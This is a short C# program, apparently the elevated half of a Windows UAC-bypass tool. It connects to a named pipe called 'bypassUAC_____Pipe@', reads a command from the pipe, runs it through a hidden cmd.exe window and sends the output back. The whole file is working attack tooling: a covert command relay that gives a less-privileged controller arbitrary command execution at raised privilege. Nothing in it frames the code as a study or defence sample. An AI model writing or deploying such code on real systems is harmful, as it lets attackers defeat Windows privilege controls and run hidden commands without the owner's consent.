using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;

namespace PipeClient
{
    class Program
    {
        static string ExecuteProcess(string command = "")
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = "/c " + command;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }
        static void Main(string[] args)
        {
            using (NamedPipeClientStream client = new NamedPipeClientStream("bypassUAC_____Pipe@"))
            {
                client.Connect();
                StreamReader sr = new StreamReader(client);
                StreamWriter sw = new StreamWriter(client);
                string cmd = sr.ReadLine();
                string[] stringSeparators = new string[] { "\r\n" };
                foreach (var line in ExecuteProcess(cmd).Split(stringSeparators, StringSplitOptions.None))
                {
                    sw.WriteLine(line);
                }
                sw.Write("exit");
                sw.Flush();
            }
        }
    }
}